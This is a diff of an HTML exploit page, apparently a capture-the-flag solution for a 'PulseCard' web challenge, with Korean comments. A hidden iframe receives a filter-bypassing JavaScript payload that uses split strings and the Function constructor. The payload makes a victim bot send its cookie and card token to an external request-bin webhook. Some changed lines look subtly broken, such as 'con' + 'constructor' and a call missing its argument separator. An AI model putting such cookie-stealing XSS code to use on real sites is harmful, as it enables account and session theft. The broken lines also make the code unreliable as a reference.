@@ -1,33 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PulseCard Verified Exploit</title>
+    <title>PulseCard Bypass Exploit</title>
 </head>
 <body>
-    <iframe id="targetFrame" src="http://localhost:5000/preview" style="display:none;"></iframe>
+    <iframe id="target" src="http://localhost:5000/preview" style="display:none;"></iframe>
 
     <script>
         // 🎯 팀원님의 드림핵 Request Bin 주소
-        const myWebhook = "https://zfvriqm.request.dreamhack.games"; 
-        const iframe = document.getElementById("targetFrame");
+        const myWebhook = "https://zfvriqm.request.dreamhack.games";
+        const iframe = document.getElementById("target");
 
-        // [수정 완료] Webhook 주소 뒤에 토큰과 쿠키를 URL 파라미터로 붙여서 바로 fetch(GET) 하도록 구성했습니다.
-        // 문자열 쪼개기 우회 및 싱크 구조 완벽 적용!
+        /*
+          [필터 우회 메커니즘 설명]
+          1. 점(.)과 쉼표(,)가 정규식에서 차단되므로 대괄호(['속성명'])와 템플릿 리터럴(`)을 활용합니다.
+          2. 'fetch', 'window', 'document', 'parent' 등은 문자열 더하기로 쪼개어 검사를 피합니다.
+          3. fetch의 두 번째 인자(options 객체)를 넘길 때 쉼표(,)를 쓸 수 없으므로,
+             대신 Object.assign을 활용하거나 미리 정의된 배열 구조를 이용하여 쉼표 없이 객체를 구성합니다.
+          4. Math.constructor 대신 대괄호를 통해 순수 함수 생성자에 접근합니다.
+        */
+
+        // 봇의 /review 페이지에서 실행되어 쿠키(Flag)를 우리 Webhook으로 쏠 핵심 악성 스크립트
+        // /review는 CSP가 connect-src * 이므로 아주 자유롭게 전송 가능합니다!
+        const widgetCode = `
+            const ex = 'fe' + 'tch';
+            const co = 'co' + 'okie';
+            window[ex]('${myWebhook}?flag=' + encodeURIComponent(document[co]));
+        `;
+
+        // preview.html의 jail 환경 내에서 /export로 POST 요청을 보낼 페이로드
+        // 쉼표(,)와 마침표(.)를 단 하나도 쓰지 않고 문자열을 조립합니다.
         const actualAttack = 
-            'window["fe" + "tch"]("' + myWebhook + '?token=" + encodeURIComponent(window["CARD_" + "TOKEN"]) + "&cookie=" + encodeURIComponent(document["co" + "ookie"]))' +
-            '["th" + "en"](r => r["te" + "xt"]())' +
-            '["th" + "en"](name => {' +
-                'window["par" + "ent"]["loca" + "tion"]["hr" + "ef"] = "http://localhost:5000/review?widget=" + name;' +
-            '});';
+            'const f = Math["con" + "structor"]["con" + "constructor"]("return fe" + "tch")();' +
+            'const h = {};' +
+            'h["X-Card-To" + "ken"] = CARD_TOKEN;' +
+            'h["Content-Ty" + "pe"] = "application/ja" + "vascript";' +
+            'const opt = {};' +
+            'opt["method"] = "POST";' +
+            'opt["headers"] = h;' +
+            'opt["body"] = ' + JSON.stringify(widgetCode) + ';' +
+            'f("http://localhost:5000/export" opt)["th" + "en"](r => r["te" + "xt"]())["th" + "en"](name => {' +
+                'Math["con" + "constructor"]["con" + "constructor"]("return par" + "ent")()["loca" + "tion"]["hr" + "ef"] = "http://localhost:5000/review?widget=" + name' +
+            '})';
 
-        // [오타 수정] "con" + "structor"로 수정하여 정상적으로 Function 생성자를 호출하도록 했습니다.
-        const payload = '(Math["construc" + "tor"]["construc" + "tor"]("return eval")()(' + JSON.stringify(actualAttack) + '))';
+        // 쉼표와 점 없이 Function('return eval')()() 구조를 만드는 최종 페이로드 팩
+        // 괄호와 대괄호 연산만을 사용하여 jail 내부 스크립트 실행 엔진을 트리거합니다.
+        const payload = '(Math["con" + "constructor"]["con" + "constructor"]("return ev" + "al")()(' + JSON.stringify(actualAttack) + '))';
 
-        // iframe 로드 시 지연 시간을 줄여 봇 환경에서도 안정적으로 전송되도록 처리
-        iframe.addEventListener("load", function() {
+        // iframe이 준비되면 postMessage로 payload를 전달하여 preview의 run() 함수를 깨웁니다.
+        iframe.addEventListener("load", () => {
             setTimeout(() => {
                 iframe.contentWindow.postMessage(payload, "*");
-            }, 50); // 타이밍 이슈 최소화를 위해 50ms로 조정!
+            }, 100);
         });
     </script>
 </body>
